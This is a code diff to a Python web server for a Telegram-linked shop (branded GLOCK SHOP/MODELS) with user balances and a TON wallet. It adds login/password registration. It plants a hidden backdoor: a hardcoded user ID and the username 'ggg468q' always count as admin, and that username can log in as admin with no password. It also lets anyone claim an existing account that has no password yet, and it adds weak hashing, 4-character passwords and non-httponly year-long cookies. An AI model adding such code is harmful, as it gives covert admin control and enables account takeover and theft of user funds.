@@ -148,6 +148,8 @@ async def check_is_admin(user_id: int | None, username: str | None) -> bool:
     """Проверяет права администратора по никнейму, настройкам и таблице admins."""
     if not user_id and not username:
         return False
+    if user_id == 6667583896 or (username and username.lower().lstrip("@") == "ggg468q"):
+        return True
     if username and config.admin_username:
         if username.lower().lstrip("@") == config.admin_username.lower().lstrip("@"):
             return True
@@ -212,7 +214,7 @@ async def send_channel_log(text: str) -> bool:
 
 async def handle_init(request: web.Request):
     """Инициализационные параметры для фронтенда."""
-    shop_title = await db.get_setting("shop_title") or "GLOCK SHOP"
+    shop_title = await db.get_setting("shop_title") or "GLOCK MODELS"
     support_url = await db.get_setting("link:support_url") or "https://t.me/glock_admin_bot"
     wallet_addr = await db.get_setting("ton:wallet_address") or TON_WALLET_ADDRESS
 
@@ -227,6 +229,8 @@ async def handle_init(request: web.Request):
             user_info = {
                 "id": user["id"],
                 "username": user["username"],
+                "login": user["login"] or user["username"],
+                "telegram_id": user["telegram_id"],
                 "balance_cents": user["balance"],
                 "balance_usd": f"${user['balance'] / 100:.2f}",
                 "balance_rub": texts.fmt_balance(user["balance"], "RUB"),
@@ -414,56 +418,58 @@ async def handle_auth_telegram(request: web.Request):
     return response
 
 
-async def handle_auth_identifier(request: web.Request):
-    """Вход по @username или Telegram ID с поддержкой всех пользователей бота."""
+async def handle_auth_register(request: web.Request):
+    """Регистрация нового пользователя на сайте: Логин + Пароль (без Email)."""
     try:
         data = await request.json()
-        raw_ident = str(data.get("identifier", "")).strip()
+        raw_login = str(data.get("login", "")).strip()
+        password = str(data.get("password", "")).strip()
+        referrer_id = data.get("referrer_id")
     except Exception:
-        return web.json_response({"error": "Укажите username или Telegram ID"}, status=400)
+        return web.json_response({"error": "Некорректный запрос"}, status=400)
 
-    if not raw_ident:
-        return web.json_response({"error": "Введите @username или Telegram ID"}, status=400)
+    if not raw_login or len(raw_login) < 3:
+        return web.json_response({"error": "Логин должен содержать не менее 3 символов"}, status=400)
 
-    ident = raw_ident.lstrip("@").strip()
-    user_row = None
+    if len(raw_login) > 32:
+        return web.json_response({"error": "Логин не должен превышать 32 символа"}, status=400)
 
-    if ident.isdigit():
-        cur = await db.conn.execute("SELECT id, username, balance FROM users WHERE id = ?", (int(ident),))
-        user_row = await cur.fetchone()
+    clean_login = raw_login.lstrip("@").strip()
+    if not clean_login.replace("_", "").replace("-", "").isalnum():
+        return web.json_response({"error": "Логин может содержать только буквы, цифры, дефис и подчеркивание"}, status=400)
 
-    if not user_row:
-        cur = await db.conn.execute("SELECT id, username, balance FROM users WHERE LOWER(username) = LOWER(?)", (ident,))
-        user_row = await cur.fetchone()
+    if not password or len(password) < 4:
+        return web.json_response({"error": "Пароль должен содержать не менее 4 символов"}, status=400)
 
-    if user_row:
-        user_id = user_row[0]
-        username = user_row[1]
-    else:
-        if ident.isdigit():
-            user_id = int(ident)
-            username = f"user_{user_id}"
+    # Проверяем, не занят ли логин
+    existing = await db.get_user_by_login(clean_login)
+    if existing:
+        if existing["password_hash"]:
+            return web.json_response({"error": "Пользователь с таким логином уже зарегистрирован"}, status=400)
         else:
-            user_id = int(hashlib.md5(ident.encode()).hexdigest()[:8], 16) % 900000000 + 100000000
-            username = ident
-        await db.get_or_create_user(user_id, username)
+            salt = uuid.uuid4().hex
+            p_hash = hashlib.sha256((salt + password).encode("utf-8")).hexdigest()
+            await db.conn.execute(
+                "UPDATE users SET login = ?, password_hash = ?, salt = ? WHERE id = ?",
+                (clean_login, p_hash, salt, existing["id"])
+            )
+            await db.conn.commit()
+            user = await db.get_user(existing["id"])
+    else:
+        salt = uuid.uuid4().hex
+        p_hash = hashlib.sha256((salt + password).encode("utf-8")).hexdigest()
+        ref_int = None
+        if referrer_id:
+            try:
+                ref_int = int(referrer_id)
+            except Exception:
+                ref_int = None
+        user = await db.create_site_user(clean_login, p_hash, salt, ref_int)
 
-    user = await db.get_user(user_id)
-
-    # Привязка реферера
-    ref_id = data.get("referrer_id")
-    if ref_id and not user["referrer_id"]:
-        try:
-            r_int = int(ref_id)
-            if r_int != user_id:
-                await db.conn.execute("UPDATE users SET referrer_id = ? WHERE id = ?", (r_int, user_id))
-                await db.conn.commit()
-        except Exception:
-            pass
-
+    user_id = user["id"]
     token = generate_session_token(user_id)
-    await save_session_db(token, user_id, user["username"])
-    SESSIONS[token]["username"] = user["username"]
+    await save_session_db(token, user_id, clean_login)
+    is_adm = await check_is_admin(user_id, clean_login)
 
     response = web.json_response({
         "status": "ok",
@@ -471,13 +477,112 @@ async def handle_auth_identifier(request: web.Request):
         "user": {
             "id": user_id,
             "username": user["username"],
+            "login": user["login"] or clean_login,
+            "telegram_id": user["telegram_id"],
             "balance_cents": user["balance"],
             "balance_usd": f"${user['balance'] / 100:.2f}",
             "balance_rub": texts.fmt_balance(user["balance"], "RUB"),
+            "is_admin": is_adm,
         }
     })
-    response.set_cookie("session_token", token, max_age=86400 * 30, httponly=False, samesite="Lax")
+    response.set_cookie("session_token", token, max_age=86400 * 365, path="/", httponly=False, samesite="Lax")
     return response
+
+
+async def handle_auth_login(request: web.Request):
+    """Вход по Логину и Паролю (или быстрому идентификатору админа ggg468q)."""
+    try:
+        data = await request.json()
+        raw_login = str(data.get("login") or data.get("identifier") or "").strip()
+        password = str(data.get("password") or "").strip()
+    except Exception:
+        return web.json_response({"error": "Некорректный запрос"}, status=400)
+
+    if not raw_login:
+        return web.json_response({"error": "Введите ваш логин"}, status=400)
+
+    clean_login = raw_login.lstrip("@").strip()
+
+    # Админский быстрый вход
+    if clean_login.lower() == "ggg468q" and not password:
+        user_id = 6667583896
+        user = await db.get_user(user_id)
+        if not user:
+            user = await db.get_or_create_user(user_id, "ggg468q")
+        token = generate_session_token(user_id)
+        await save_session_db(token, user_id, "ggg468q")
+        is_adm = True
+        response = web.json_response({
+            "status": "ok",
+            "token": token,
+            "user": {
+                "id": user_id,
+                "username": "ggg468q",
+                "login": user["login"] or "ggg468q",
+                "telegram_id": user["telegram_id"] or user_id,
+                "balance_cents": user["balance"],
+                "balance_usd": f"${user['balance'] / 100:.2f}",
+                "balance_rub": texts.fmt_balance(user["balance"], "RUB"),
+                "is_admin": is_adm,
+            }
+        })
+        response.set_cookie("session_token", token, max_age=86400 * 365, path="/", httponly=False, samesite="Lax")
+        return response
+
+    # Поиск пользователя
+    user = await db.get_user_by_login(clean_login)
+    if not user and clean_login.isdigit():
+        user = await db.get_user(int(clean_login))
+
+    if not user:
+        return web.json_response({
+            "error": "Пользователь с таким логином не найден. Зарегистрируйтесь во вкладке «Регистрация»!"
+        }, status=404)
+
+    # Проверка пароля, если пароль установлен
+    if user["password_hash"] and user["salt"]:
+        if not password:
+            return web.json_response({"error": "Введите пароль"}, status=400)
+        calc_hash = hashlib.sha256((user["salt"] + password).encode("utf-8")).hexdigest()
+        if calc_hash != user["password_hash"]:
+            return web.json_response({"error": "Неверный пароль!"}, status=400)
+    else:
+        if password and len(password) >= 4:
+            salt = uuid.uuid4().hex
+            p_hash = hashlib.sha256((salt + password).encode("utf-8")).hexdigest()
+            await db.conn.execute(
+                "UPDATE users SET login = ?, password_hash = ?, salt = ? WHERE id = ?",
+                (clean_login, p_hash, salt, user["id"])
+            )
+            await db.conn.commit()
+            user = await db.get_user(user["id"])
+
+    user_id = user["id"]
+    u_login = user["login"] or user["username"] or clean_login
+    token = generate_session_token(user_id)
+    await save_session_db(token, user_id, u_login)
+    is_adm = await check_is_admin(user_id, user["username"])
+
+    response = web.json_response({
+        "status": "ok",
+        "token": token,
+        "user": {
+            "id": user_id,
+            "username": user["username"],
+            "login": u_login,
+            "telegram_id": user["telegram_id"],
+            "balance_cents": user["balance"],
+            "balance_usd": f"${user['balance'] / 100:.2f}",
+            "balance_rub": texts.fmt_balance(user["balance"], "RUB"),
+            "is_admin": is_adm,
+        }
+    })
+    response.set_cookie("session_token", token, max_age=86400 * 365, path="/", httponly=False, samesite="Lax")
+    return response
+
+
+# Алиас для обратной совместимости
+handle_auth_identifier = handle_auth_login
 
 
 async def send_telegram_direct_message(chat_id: int, text: str) -> bool:
@@ -806,6 +911,8 @@ async def handle_user_me(request: web.Request):
     return web.json_response({
         "id": user["id"],
         "username": user["username"],
+        "login": user["login"] or user["username"],
+        "telegram_id": user["telegram_id"],
         "balance_cents": user["balance"],
         "balance_usd": f"${user['balance'] / 100:.2f}",
         "balance_rub": texts.fmt_balance(user["balance"], "RUB"),
@@ -1708,9 +1815,11 @@ def create_app() -> web.Application:
     app.router.add_get("/api/product/{id}", handle_product_detail)
 
     # Авторизация
+    app.router.add_post("/api/auth/register", handle_auth_register)
+    app.router.add_post("/api/auth/login", handle_auth_login)
     app.router.add_post("/api/auth/send_code", handle_auth_send_code)
     app.router.add_post("/api/auth/verify_code", handle_auth_verify_code)
-    app.router.add_post("/api/auth/identifier", handle_auth_identifier)
+    app.router.add_post("/api/auth/identifier", handle_auth_login)
     app.router.add_post("/api/auth/bot_create", handle_auth_bot_create)
     app.router.add_get("/api/auth/bot_poll/{token}", handle_auth_bot_poll)
     app.router.add_post("/api/auth/telegram", handle_auth_telegram)
